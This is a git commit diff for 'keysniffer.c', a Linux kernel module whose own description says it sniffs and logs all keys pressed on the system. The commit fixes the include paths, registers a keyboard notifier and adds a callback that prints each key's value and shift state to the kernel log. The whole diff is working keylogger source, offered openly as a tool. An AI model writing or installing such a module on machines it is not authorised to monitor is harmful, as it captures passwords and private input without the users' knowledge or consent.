35d11eac46d143b1de369853c8040a630fb0a882
Arun Prakash Jana <engineerarun@gmail.com>
2015-10-10 15:35:25 +0530

    Grab the callback values and print in dmesg.
    Signed-off-by: Arun Prakash Jana <engineerarun@gmail.com>

--- keysniffer.c
+++ keysniffer.c
@@ -1,20 +1,38 @@
-#include<init.h>
-#include<kernel.h>
-#include<module.h>
-#include<keyboard.h>
+#include<linux/init.h>
+#include<linux/kernel.h>
+#include<linux/module.h>
+#include<linux/keyboard.h>
 
-MODULE_LICENSE("GPL v3");
+MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");
 
+/* Declarations */
+static struct mutex kbd_mutex;
+int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
+
+/* Definitions */
 static struct notifier_block keysniffer_blk = {
-	.notifier_call = keysniffer_cb;
+	.notifier_call = keysniffer_cb,
 };
 
+int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param)
+{
+	struct keyboard_notifier_param *param = _param;
+	pr_debug("keysniffer_cb called.\n");
+	pr_debug("down: %d, shift: %d, value: %u\n",
+		param->down, param->shift, param->value);
+
+	return NOTIFY_OK;
+}
 
 static int __init keysniffer_init(void)
 {
 	pr_debug("keysniffer init\n");
+
+	register_keyboard_notifier(&keysniffer_blk);
+	mutex_init(&kbd_mutex);
+
 	return 0;
 }
 
